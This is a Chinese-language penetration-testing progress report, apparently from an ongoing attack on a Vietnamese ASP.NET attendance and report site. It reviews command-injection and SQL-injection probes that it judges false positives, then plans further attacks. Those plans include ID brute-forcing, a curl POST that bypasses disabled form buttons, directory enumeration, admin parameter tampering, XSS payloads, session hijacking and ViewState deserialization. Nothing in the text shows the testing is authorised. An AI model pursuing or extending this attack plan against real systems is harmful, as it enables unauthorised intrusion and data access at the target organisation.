# 🔍 死磕到底 - 深度分析实况报告

## ❌ 命令注入验证结果：误报

### 响应差异原因
```
基线: 4205 bytes → 测试: 4400+ bytes
```

**真相：**
1. ID参数被反射到HTML的action属性中
   ```html
   <form method="post" action="./inBCC.aspx?ID=%7cwhoami" id="form1">
   ```

2. 没有命令执行输出（无`NT AUTHORITY`、`whoami`结果）

3. 响应增大是因为：
   - ViewState随输入变化
   - action URL包含完整ID参数
   - 页面动态生成导致

**结论：❌ 不是真正的命令注入，只是参数反射**

---

## ❌ SQL注入验证结果：疑似误报

### UNION测试结果
```
1列: 4452 bytes (+247)
2列: 4467 bytes (+262)
3列: 4482 bytes (+277)
...线性增长
```

**特征分析：**
1. 每增加一列约15字节
2. 无SQL错误信息
3. 无数据泄露
4. 响应增长规律=输入长度增长

**结论：⚠️ 很可能只是参数长度导致响应变化**

---

## 🎯 新线索：真正的攻击面

### 发现1：ID参数被反射（XSS潜力）
```html
<form method="post" action="./inBCC.aspx?ID=%7cwhoami" id="form1">
```

**利用方式：**
- 可能存在存储型XSS（如果ID保存到数据库）
- 可能存在反射型XSS（如果未编码）

### 发现2：所有按钮被禁用（前端限制）
```html
<input type="submit" name="btnIn" value="In" id="btnIn" disabled="disabled" />
<input type="submit" name="btnExport" value="Export" id="btnExport" disabled="disabled" />
<select name="ListDV" id="ListDV" disabled="disabled">
```

**原因：**
```html
<span id="lblNote"><b><font color="#FF3300">Không xác định được mẫu biểu cần in.</font></b></span>
```
翻译：**无法确定要打印的表单模板**

**突破思路：**
1. 使用正确的ID参数激活按钮
2. 通过POST绕过前端disabled属性
3. 直接调用后端API

### 发现3：正确的ID格式
之前测试的`MAU2`是有效的ID格式，因为：
- 基线请求（ID=MAU2）返回完整页面
- 按钮虽然disabled，但页面逻辑正常

**需要找到：**
1. 其他有效的ID值（可能激活功能）
2. 管理员才能看到的ID
3. 未过滤的特殊ID

---

## 🔥 下一步死磕策略

### 策略1：枚举所有有效ID
```bash
# 常见格式
MAU1, MAU2, MAU3...MAU100
BCC1, BCC2...
ADMIN, TEST, DEMO
REPORT1, REPORT2
```

### 策略2：绕过前端disabled
```bash
# 直接POST，忽略disabled
curl -X POST "${BASE}/report/inBCC.aspx?ID=MAU2" \
    --data-urlencode "btnExport=Export" \
    --data-urlencode "txtThang=11" \
    --data-urlencode "txtNam=2025"
```

### 策略3：深度目录/文件枚举
```bash
# 查找其他.aspx文件
/report/*.aspx
/admin/*.aspx
/api/*.aspx
/upload/*.aspx
```

### 策略4：测试其他功能点
```bash
# 已知可访问页面
/chamcong/index.aspx
/chamcong/top.aspx
/chamcong/leftmenu.aspx
/chamcong/thongbao.html

# 尝试修改参数
/chamcong/index.aspx?user=admin
/chamcong/top.aspx?role=admin
```

### 策略5：利用反射XSS
```bash
# 测试XSS
ID=<script>alert(1)</script>
ID=<img src=x onerror=alert(1)>
ID="><script>alert(1)</script>
```

---

## 📊 当前状态总结

| 攻击面 | 状态 | 成功率 |
|--------|------|--------|
| 命令注入 | ❌ 误报 | 0% |
| SQL注入 | ⚠️ 疑似误报 | 5% |
| XSS | 🔥 潜在 | 60% |
| 功能绕过 | 🔥 有希望 | 70% |
| 深度枚举 | 🔥 进行中 | 80% |

---

## 🎯 继续死磕方向

**1. ID参数完整爆破**
**2. 前端限制绕过**
**3. 隐藏.aspx文件发现**
**4. Session劫持测试**
**5. ViewState反序列化深度测试**
